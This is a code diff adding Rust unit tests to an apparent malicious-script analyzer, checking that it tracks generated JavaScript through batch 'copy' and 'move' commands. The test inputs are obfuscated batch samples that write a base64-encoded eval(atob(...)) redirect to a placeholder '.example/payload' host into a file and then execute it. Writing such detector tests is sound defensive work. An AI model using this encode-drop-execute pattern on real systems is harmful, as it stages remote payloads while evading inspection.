@@ -14354,6 +14354,24 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copy_to_tracked_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
+mkdir C:\Temp
+copy /y original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-tracked-dir.example/payload")
+            }),
+            "copy to tracked directory did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copy_explicit_source_path_does_not_use_unrelated_basename_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS13cm9uZy1iYXNlbmFtZS5leGFtcGxlL3BheWxvYWQn")) > D:\Other\original.js
@@ -14463,6 +14481,24 @@ echo %MARK%"#,
             report.deobfuscated.contains("echo moved"),
             "move did not update source file state for if not exist:\n{}\ntraits={:?}",
             report.deobfuscated,
+            report.traits
+        );
+    }
+
+    #[test]
+    fn move_to_tracked_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
+mkdir C:\Temp
+move /y original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://move-tracked-dir.example/payload")
+            }),
+            "move to tracked directory did not preserve generated JS content: {:?}",
             report.traits
         );
     }
